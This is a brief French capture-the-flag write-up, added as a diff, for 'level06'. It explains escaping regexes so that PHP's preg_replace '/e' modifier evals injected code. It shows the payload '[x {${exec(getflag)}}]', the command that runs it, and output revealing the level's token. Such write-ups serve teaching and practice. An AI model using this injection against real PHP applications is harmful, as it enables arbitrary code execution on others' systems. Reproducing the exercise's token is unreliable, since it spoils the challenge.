@@ -1,0 +1,9 @@
+On observe dans level06.php de grosse regex, l'objectif de cet exercice est de trouver comment passer au travers de ces regex afin de lancer getflag via le modifier "e" (faille de la fonction preg_replace qui lance un eval())
+
+echo '[x {${exec(getflag)}}]' > /tmp/test1
+
+Utilisation de la synthaxe PHP {${function()}}
+
+./level06 /tmp/test1
+PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
